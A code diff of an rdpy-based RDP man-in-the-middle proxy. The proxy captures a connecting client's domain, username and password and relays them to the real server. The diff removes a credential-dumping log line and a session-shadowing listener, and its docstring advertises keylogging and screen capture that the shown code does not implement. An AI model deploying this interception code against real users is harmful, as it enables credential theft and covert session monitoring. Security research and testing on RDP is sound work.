@@ -19,31 +19,27 @@
 #
 
 """
-RDP proxy with spy capabilities
+RDP proxy with Man in the middle capabilities
+Save bitmap in file and keylogging
                ---------------------------
 Client RDP -> | ProxyServer | ProxyClient | -> Server RDP
                ---------------------------
-                    | ProxyShadow |
+                    | Save Session |
                     --------------
-                          ^
-Shadow -------------------|
 """
 
 import sys, os, getopt, json
 
 from rdpy.core import log, error
 from rdpy.protocol.rdp import rdp
-from rdpy.ui import view
 from twisted.internet import reactor
-from PyQt4 import QtCore, QtGui
 
-log._LOG_LEVEL = log.Level.INFO
+log._LOG_LEVEL = log.Level.DEBUG
 
 class ProxyServer(rdp.RDPServerObserver):
     """
     @summary: Server side of proxy
     """
-    _SESSIONS_ = {}
     def __init__(self, controller, target):
         """
         @param controller: {RDPServerController}
@@ -52,8 +48,9 @@ class ProxyServer(rdp.RDPServerObserver):
         rdp.RDPServerObserver.__init__(self, controller)
         self._target = target
         self._client = None
+        self._close = False
     
-    def clientConnected(self, client):
+    def onClientReady(self, client):
         """
         @summary: Event throw by client when it's ready
         @param client: {ProxyClient}
@@ -61,8 +58,6 @@ class ProxyServer(rdp.RDPServerObserver):
         self._client = client
         #need to reevaluate color depth
         self._controller.setColorDepth(self._client._controller.getColorDepth())
-        ProxyServer._SESSIONS_[self._controller.getHostname()] = client
-        nowConnected()
         
     def onReady(self):
         """
@@ -75,7 +70,6 @@ class ProxyServer(rdp.RDPServerObserver):
         if self._client is None:
             #try a connection
             domain, username, password = self._controller.getCredentials()
-            log.info("Credentials dump : connection from %s with %s\\%s [%s]"%(self._controller.getHostname(), domain, username, password))
             
             width, height = self._controller.getScreen()
             reactor.connectTCP(self._target[0], int(self._target[1]), ProxyClientFactory(self, width, height, 
@@ -90,11 +84,10 @@ class ProxyServer(rdp.RDPServerObserver):
         @summary: Call when human client close connection
         @see: rdp.RDPServerObserver.onClose
         """
+        self._close = True
         if self._client is None:
             return
         
-        del ProxyServer._SESSIONS_[self._controller.getHostname()]
-        nowConnected()
         #close proxy client
         self._client._controller.close()
         
@@ -145,6 +138,7 @@ class ProxyServerFactory(rdp.ServerFactory):
         """
         rdp.ServerFactory.__init__(self, 16, privateKeyFilePath, certificateFilePath)
         self._target = target
+        self._main = None
         
     def buildObserver(self, controller, addr):
         """
@@ -152,6 +146,7 @@ class ProxyServerFactory(rdp.ServerFactory):
         @param addr: destination address
         @see: rdp.ServerFactory.buildObserver
         """
+        #first build main session
         return ProxyServer(controller, self._target)
     
 class ProxyClient(rdp.RDPClientObserver):
@@ -181,13 +176,14 @@ class ProxyClient(rdp.RDPClientObserver):
         else:
             self._connected = True
     
-        self._server.clientConnected(self)
+        self._server.onClientReady(self)
         
     def onClose(self):
         """
         @summary: Event inform that stack is close
         @see: rdp.RDPClientObserver.onClose
         """
+        self._server._controller.close()
         
     def onUpdate(self, destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, isCompress, data):
         """
@@ -241,142 +237,39 @@ class ProxyClientFactory(rdp.ClientFactory):
         controller.setUsername(self._username)
         controller.setPassword(self._password)
         controller.setSecurityLevel(self._security)
-        return ProxyClient(controller, self._server)
-    
-    def clientConnectionLost(self, connector, reason):
-        """
-        @summary: Connection lost event
-        @param connector: twisted connector use for rdp connection (use reconnect to restart connection)
-        @param reason: str use to advertise reason of lost connection
-        """
-        #try reconnect with basic RDP security
-        if reason.type == error.RDPSecurityNegoFail:
-            #stop nego
-            log.info("due to security nego error back to standard RDP security layer")
-            self._security = "rdp"
-            connector.connect()
-            return            
-    
-class Shadow(rdp.RDPServerObserver):
-    """
-    @summary:  Use to manage admin session
-    """
-    def __init__(self, controller):
-        """
-        @param server: rdp.RDPServerController
-        """
-        rdp.RDPServerObserver.__init__(self, controller)
-        self._client = None
-     
-    def onReady(self):
-        """
-        @summary:  Stack is ready and connected
-                    May be called after an setColorDepth too
-        @see: rdp.RDPServerObserver.onReady
-        """
-        if self._client is None:
-            username = self._controller.getUsername()
-            if not ProxyServer._SESSIONS_.has_key(username):
-                log.info("invalid session name [%s]"%username)
-                self._controller.close()
-                return
-            
-            self._client = ProxyClient(ProxyServer._SESSIONS_[username]._controller, self)
-            self._controller.setColorDepth(self._client._controller.getColorDepth())
-        else:
-            #refresh client
-            width, height = self._controller.getScreen()
-            self._client._controller.sendRefreshOrder(0, 0, width, height)
-    
-    def onClose(self):
-        """
-        @summary: Stack is close
-        @see: rdp.RDPServerObserver.onClose
-        """
-    
-    def onKeyEventScancode(self, code, isPressed):
-        """ Shadow
-        """
-    
-    def onKeyEventUnicode(self, code, isPressed):
-        """ Shadow
-        """
-    
-    def onPointerEvent(self, x, y, button, isPressed):
-        """ Shadow
-        """
-        
-class ShadowFactory(rdp.ServerFactory):
-    """
-    @summary:  Factory for admin session
-    """
-    def __init__(self, privateKeyFilePath, certificateFilePath):
-        """
-        @param privateKeyFilePath: private key for admin session
-        @param certificateFilePath: certificate for admin session
-        """
-        rdp.ServerFactory.__init__(self, 16, privateKeyFilePath, certificateFilePath)
-        
-    def buildObserver(self, controller, addr):
-        """
-        @summary: Build ProxyAdmin
-        @param controller: rdp.RDPServerController
-        @param addr: destination address
-        @return: ProxyAdmin
-        @see: rdp.ServerFactory.buildObserver
-        """
-        return Shadow(controller)
+        return ProxyClient(controller, self._server)          
     
 def help():
     """
     @summary: Print help in console
     """
-    print "Usage: rdpy-rdpproxy -t target_ip[:target_port] [-k private_key_file_path (mandatory for SSL)] [-c certificate_file_path (mandatory for SSL)] [-i admin_ip[:admin_port]] listen_port"
+    print "Usage: rdpy-rdpshare.py [-l listen_port default 3389] [-k private_key_file_path (mandatory for SSL)] [-c certificate_file_path (mandatory for SSL)] [-i admin_ip[:admin_port]] target"
 
 def parseIpPort(interface, defaultPort = "3389"):
     if ':' in interface:
         return interface.split(':')
     else:
         return interface, defaultPort
-    
-def nowConnected():
-    log.info("*" * 50)
-    log.info("Now connected")
-    log.info(ProxyServer._SESSIONS_.keys())
-    log.info("*" * 50)
 
 if __name__ == '__main__':
-    target = None
+    listen = "3389"
     privateKeyFilePath = None
     certificateFilePath = None
-    shadowInterface = None
     
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "ht:k:c:i:")
+        opts, args = getopt.getopt(sys.argv[1:], "hl:k:c:")
     except getopt.GetoptError:
         help()
     for opt, arg in opts:
         if opt == "-h":
             help()
             sys.exit()
-        elif opt == "-t":
-            target = arg
+        elif opt == "-l":
+            listen = arg
         elif opt == "-k":
             privateKeyFilePath = arg
         elif opt == "-c":
             certificateFilePath = arg
-        elif opt == "-i":
-            shadowInterface = arg
-            
-    if target is None:
-        log.error("Target is mandatory")
-        help()
-        sys.exit()
     
-    reactor.listenTCP(int(args[0]), ProxyServerFactory(parseIpPort(target), privateKeyFilePath, certificateFilePath))
-    
-    if not shadowInterface is None:
-        shadowInterface, shadowPort = parseIpPort(shadowInterface)
-        log.info("Shadow listener on %s:%s"%(shadowInterface, shadowPort))
-        reactor.listenTCP(int(shadowPort), ShadowFactory(privateKeyFilePath, certificateFilePath), interface = shadowInterface)
+    reactor.listenTCP(int(listen), ProxyServerFactory(parseIpPort(args[0]), privateKeyFilePath, certificateFilePath))
     reactor.run()
